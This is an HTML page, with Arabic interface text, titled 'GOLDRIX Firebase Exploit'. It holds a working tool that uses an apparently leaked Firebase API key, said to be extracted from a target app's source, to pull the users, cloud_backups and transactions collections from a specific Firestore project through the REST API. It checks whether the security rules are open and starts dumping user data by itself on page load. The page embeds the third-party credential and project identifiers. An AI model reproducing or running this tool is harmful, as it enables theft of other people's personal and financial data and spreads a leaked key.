<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOLDRIX - Firebase Data Extraction</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #e2e8f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 1px solid #334155;
            padding-bottom: 20px;
        }
        h1 { color: #10b981; margin-bottom: 5px; }
        p { color: #94a3b8; font-size: 14px; }
        .status {
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: bold;
            text-align: center;
        }
        .status.loading { background: #eab308; color: #000; }
        .status.success { background: #10b981; color: #000; }
        .status.error { background: #ef4444; color: #fff; }
        .data-section {
            background: #1e293b;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #334155;
            display: none;
        }
        .data-section h2 {
            color: #38bdf8;
            margin-top: 0;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
        }
        pre {
            background: #000;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            color: #a78bfa;
            font-family: 'Courier New', Courier, monospace;
            font-size: 13px;
            direction: ltr;
            text-align: left;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .btn {
            background: #10b981;
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        .btn:hover { background: #059669; }
        .user-card {
            background: #0f172a;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            border-left: 4px solid #10b981;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>GOLDRIX Firebase Exploit</h1>
        <p>Direct connection to: gen-lang-client-0589567342</p>
    </header>

    <div id="status" class="status loading">جاري الاتصال بقاعدة البيانات...</div>

    <button class="btn" onclick="fetchData('users')">جلب المستخدمين (users)</button>
    <button class="btn" onclick="fetchData('cloud_backups')">جلب النسخ الاحتياطية (cloud_backups)</button>
    <button class="btn" onclick="fetchData('transactions')">جلب المعاملات (transactions)</button>

    <div id="users-section" class="data-section">
        <h2>بيانات المستخدمين (Users)</h2>
        <pre id="users-data">بانتظار الجلب...</pre>
    </div>

    <div id="backups-section" class="data-section">
        <h2>النسخ الاحتياطية (Cloud Backups)</h2>
        <pre id="backups-data">بانتظار الجلب...</pre>
    </div>

    <div id="transactions-section" class="data-section">
        <h2>المعاملات (Transactions)</h2>
        <pre id="transactions-data">بانتظار الجلب...</pre>
    </div>
</div>

<script type="module">
    // Firebase Keys extracted from the source code
    const firebaseConfig = {
        apiKey: "AIzaSyBbGpHW0ItpWrffXntHaF_BP8A2NjaLC6w",
        authDomain: "gen-lang-client-0589567342.firebaseapp.com",
        projectId: "gen-lang-client-0589567342",
    };

    const DATABASE_ID = "ai-studio-goldrixdigitalas-80bc2c2b-b4d6-4bcc-9fdd-4715b1d01508";

    const statusEl = document.getElementById('status');

    // استخدام REST API الخاص بـ Firestore مباشرة لتجاوز الحاجة للمكتبات
    async function fetchFirestore(collectionName) {
        const url = `https://firestore.googleapis.com/v1/projects/${firebaseConfig.projectId}/databases/${DATABASE_ID}/documents/${collectionName}?key=${firebaseConfig.apiKey}`;
        
        try {
            const response = await fetch(url);
            const data = await response.json();

            if (response.ok) {
                statusEl.className = 'status success';
                statusEl.innerText = `تم الاتصال بنجاح! (قواعد الأمان مفتوحة)`;
                return data;
            } else {
                statusEl.className = 'status error';
                statusEl.innerText = `فشل الاتصال: ${data.error.message} (قواعد الأمان محمية)`;
                return null;
            }
        } catch (error) {
            statusEl.className = 'status error';
            statusEl.innerText = `خطأ في الشبكة: ${error.message}`;
            return null;
        }
    }

    window.fetchData = async function(collection) {
        const section = document.getElementById(`${collection.replace('_', '')}-section`);
        const dataEl = document.getElementById(`${collection.replace('_', '')}-data`);
        
        if (!section) {
            // إذا لم يكن القسم موجوداً في HTML، قم بإنشائه ديناميكياً
            const newSection = document.createElement('div');
            newSection.id = `${collection}-section`;
            newSection.className = 'data-section';
            newSection.style.display = 'block';
            newSection.innerHTML = `<h2>بيانات: ${collection}</h2><pre id="${collection}-data">جاري الجلب...</pre>`;
            document.querySelector('.container').appendChild(newSection);
        } else {
            section.style.display = 'block';
        }

        statusEl.className = 'status loading';
        statusEl.innerText = `جاري جلب ${collection}...`;

        const data = await fetchFirestore(collection);

        if (data && data.documents) {
            // تنسيق البيانات لتكون مقروءة
            const formatted = data.documents.map(doc => {
                const id = doc.name.split('/').pop();
                return { id, ...doc.fields };
            });
            
            document.getElementById(`${collection}-data`).innerText = JSON.stringify(formatted, null, 2);
        } else {
            document.getElementById(`${collection}-data`).innerText = "لم يتم العثور على بيانات أو تم رفض الوصول.";
        }
    };

    // محاولة جلب أولي عند تحميل الصفحة
    window.addEventListener('load', async () => {
        const check = await fetchFirestore('users');
        if (check) {
             window.fetchData('users');
        }
    });

</script>
</body>
</html>
